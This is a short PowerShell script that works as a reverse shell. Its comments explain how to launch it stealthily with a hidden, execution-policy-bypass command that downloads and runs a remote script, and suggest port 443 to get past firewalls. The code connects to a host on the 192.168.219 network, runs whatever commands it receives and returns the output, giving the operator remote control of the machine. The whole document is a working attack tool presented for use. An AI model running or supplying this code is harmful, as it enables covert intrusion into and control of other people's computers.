
# Here is how to launch without getting much attention
# powershell.exe -NoP -NonI -W Hidden -Exec Bypass "IEX(New-Object Net.WebClient).downloadString('http://192.168.219.xxx/oneliner.ps1')"


#try using port 443 which is normally open and not blocked by the firewall but you might need root for that... just check

$client = New-Object System.Net.Sockets.TCPClient('192.168.219.xxx',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PSReverseShell# ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();

